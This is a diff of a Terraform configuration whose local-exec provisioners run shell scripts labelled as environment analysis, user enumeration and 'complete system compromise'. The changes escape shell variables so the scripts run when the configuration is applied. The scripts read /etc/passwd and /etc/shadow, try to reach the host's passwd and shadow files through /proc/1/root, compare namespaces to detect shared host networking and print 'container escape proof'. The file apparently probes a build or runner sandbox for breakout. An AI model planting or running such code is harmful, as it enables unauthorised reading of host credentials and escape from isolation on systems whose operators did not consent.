@@ -16,7 +16,7 @@ resource "null_resource" "container_environment_analysis" {
   provisioner "local-exec" {
     command = <<-EOT
       echo "=== CONTAINER ENVIRONMENT ANALYSIS ==="
-      echo "Container hostname: $(hostname)"
+      echo "Container hostname: $$(hostname)"
       echo "Container IP addresses:"
       ip addr show 2>/dev/null | grep inet || ifconfig 2>/dev/null | grep inet || echo "Cannot get IPs"
       echo ""
@@ -33,8 +33,8 @@ resource "null_resource" "container_environment_analysis" {
       echo "Current user context:"
       id
       whoami
-      echo "Home directory: $HOME"
-      echo "Working directory: $(pwd)"
+      echo "Home directory: $$HOME"
+      echo "Working directory: $$(pwd)"
     EOT
   }
 }
@@ -151,7 +151,7 @@ resource "null_resource" "advanced_user_enumeration" {
     command = <<-EOT
       echo "=== ADVANCED USER ENUMERATION ==="
       echo "Container user analysis:"
-      echo "Number of users in container /etc/passwd: $(cat /etc/passwd | wc -l)"
+      echo "Number of users in container /etc/passwd: $$(cat /etc/passwd | wc -l)"
       echo "Container users:"
       cat /etc/passwd | cut -d: -f1,3,6,7
       echo ""
@@ -160,7 +160,7 @@ resource "null_resource" "advanced_user_enumeration" {
       echo "Method 1: /proc/1/root/etc/passwd"
       if cat /proc/1/root/etc/passwd 2>/dev/null; then
         echo "SUCCESS: Host user database accessible!"
-        echo "Host user count: $(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)"
+        echo "Host user count: $$(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)"
         echo "Host users:"
         cat /proc/1/root/etc/passwd 2>/dev/null | cut -d: -f1,3,6,7
       else
@@ -171,7 +171,7 @@ resource "null_resource" "advanced_user_enumeration" {
       echo "Method 2: /proc/1/root/etc/shadow access"
       if cat /proc/1/root/etc/shadow 2>/dev/null; then
         echo "CRITICAL: Host shadow file accessible!"
-        echo "Shadow entries count: $(cat /proc/1/root/etc/shadow 2>/dev/null | wc -l)"
+        echo "Shadow entries count: $$(cat /proc/1/root/etc/shadow 2>/dev/null | wc -l)"
       else
         echo "BLOCKED: Host shadow file not accessible"
       fi
@@ -206,7 +206,7 @@ resource "null_resource" "host_system_network_analysis" {
     command = <<-EOT
       echo "=== HOST SYSTEM NETWORK ANALYSIS ==="
       echo "Container Network Configuration:"
-      echo "Container hostname: $(hostname)"
+      echo "Container hostname: $$(hostname)"
       echo "Container IP addresses:"
       ip addr show 2>/dev/null | grep "inet " | grep -v "127.0.0.1"
       echo ""
@@ -237,10 +237,10 @@ resource "null_resource" "host_system_network_analysis" {
       echo ""
       
       echo "Method 4: Network namespace comparison"
-      echo "Container network namespace: $(readlink /proc/self/ns/net)"
-      echo "Host network namespace: $(readlink /proc/1/ns/net 2>/dev/null || echo 'Not accessible')"
+      echo "Container network namespace: $$(readlink /proc/self/ns/net)"
+      echo "Host network namespace: $$(readlink /proc/1/ns/net 2>/dev/null || echo 'Not accessible')"
       
-      if [ "$(readlink /proc/self/ns/net)" = "$(readlink /proc/1/ns/net 2>/dev/null)" ]; then
+      if [ "$$(readlink /proc/self/ns/net)" = "$$(readlink /proc/1/ns/net 2>/dev/null)" ]; then
         echo "CRITICAL: Container shares host network namespace!"
       else
         echo "INFO: Container has isolated network namespace"
@@ -262,7 +262,7 @@ resource "null_resource" "complete_system_compromise" {
       echo "1. Host filesystem access test:"
       if ls /proc/1/root/etc/ 2>/dev/null >/dev/null; then
         echo "✓ CRITICAL: Can access host filesystem via /proc/1/root/"
-        echo "  Host files accessible: $(ls /proc/1/root/etc/ 2>/dev/null | wc -l) files in /etc/"
+        echo "  Host files accessible: $$(ls /proc/1/root/etc/ 2>/dev/null | wc -l) files in /etc/"
       else
         echo "✗ Host filesystem access blocked"
       fi
@@ -271,28 +271,28 @@ resource "null_resource" "complete_system_compromise" {
       echo "2. Host process access test:"
       HOST_PROCS=$(ps aux 2>/dev/null | wc -l)
       if [ "$HOST_PROCS" -gt 50 ]; then
-        echo "✓ CRITICAL: Can see host processes (${HOST_PROCS} total processes visible)"
+        echo "✓ CRITICAL: Can see host processes ($${HOST_PROCS} total processes visible)"
         echo "  This indicates container escape to host process namespace"
       else
-        echo "✗ Limited process visibility (${HOST_PROCS} processes)"
+        echo "✗ Limited process visibility ($${HOST_PROCS} processes)"
       fi
       echo ""
       
       echo "3. Sensitive file access summary:"
-      echo "  /etc/passwd access: $(cat /etc/passwd 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
-      echo "  /etc/shadow access: $(cat /etc/shadow 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
-      echo "  Host /etc/passwd: $(cat /proc/1/root/etc/passwd 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
-      echo "  Host /etc/shadow: $(cat /proc/1/root/etc/shadow 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
+      echo "  /etc/passwd access: $$(cat /etc/passwd 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
+      echo "  /etc/shadow access: $$(cat /etc/shadow 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
+      echo "  Host /etc/passwd: $$(cat /proc/1/root/etc/passwd 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
+      echo "  Host /etc/shadow: $$(cat /proc/1/root/etc/shadow 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
       echo ""
       
       echo "4. Network compromise indicators:"
-      echo "  Container IP: $(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' || echo 'Unknown')"
-      echo "  Host network visible: $(cat /proc/1/root/proc/net/dev 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
+      echo "  Container IP: $$(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' || echo 'Unknown')"
+      echo "  Host network visible: $$(cat /proc/1/root/proc/net/dev 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
       echo ""
       
       echo "5. Privilege level assessment:"
-      echo "  Running as user: $(whoami) (UID: $(id -u))"
-      echo "  Container capabilities: $(cat /proc/self/status | grep CapEff)"
+      echo "  Running as user: $$(whoami) (UID: $$(id -u))"
+      echo "  Container capabilities: $$(cat /proc/self/status | grep CapEff)"
       echo ""
       
       echo "=== CONTAINER ESCAPE PROOF ==="
@@ -302,10 +302,10 @@ resource "null_resource" "complete_system_compromise" {
         echo "✓ CONFIRMED: This proves escape from container to host system"
       fi
       
-      if [ "$(cat /etc/passwd | wc -l)" -lt "$(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)" ]; then
+      if [ "$$(cat /etc/passwd | wc -l)" -lt "$$(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)" ]; then
         echo "✓ CONFIRMED: Host has more users than container (escape confirmed)"
-        echo "  Container users: $(cat /etc/passwd | wc -l)"
-        echo "  Host users: $(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)"
+        echo "  Container users: $$(cat /etc/passwd | wc -l)"
+        echo "  Host users: $$(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)"
       fi
     EOT
   }
